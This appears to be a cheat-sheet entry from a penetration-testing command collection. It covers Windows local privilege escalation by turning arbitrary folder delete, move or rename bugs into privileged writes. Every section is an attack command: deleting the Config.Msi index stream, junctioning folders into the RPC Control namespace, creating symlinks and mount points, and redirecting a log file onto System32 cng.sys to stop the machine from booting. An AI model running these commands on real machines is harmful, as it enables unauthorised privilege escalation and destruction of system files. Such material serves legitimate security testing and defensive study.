---
technique: Arbitrary Folder Delete Move Rename EoP
category: privilege-escalation
targets: Windows Workstation, Windows Server
protocols: Local
remote_capable: false
tags: windows lpe filesystem junction symlink mountpoint arbitrary-delete arbitrary-move
---

# Arbitrary Folder Delete Move Rename EoP

Some local privilege escalation chains turn an arbitrary folder delete, move, or rename primitive into privileged filesystem writes using junctions, mount points, and object manager symlinks. These commands preserve the primitive-building notes from the HackTricks dump.

## Windows

### Config.Msi ADS delete

```cmd title:"DeleteFileW on Config.Msi index allocation stream"
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
<!-- cheat
var INDEX_ALLOCATION
-->

### junction to RPC Control

```cmd title:"Junction a folder to the RPC Control object namespace"
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
<!-- cheat -->

### symlink RPC entry to Config.Msi

```cmd title:"Symlink RPC Control entry to Config.Msi index stream"
CreateSymlink "\\RPC Control\\file1.txt" "C:\\Config.Msi::$INDEX_ALLOCATION"
```
<!-- cheat
var INDEX_ALLOCATION
-->

### stage iconics_user temp

```cmd title:"Pre-create iconics_user log dir for RegPwn-style symlink chain"
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
```
<!-- cheat -->

### mount RPC Control

```cmd title:"Replace staged folder with RPC Control mount point"
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
```
<!-- cheat -->

### symlink to cng.sys

```cmd title:"Symlink RPC Control log entry to cng.sys for boot DoS"
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
<!-- cheat -->
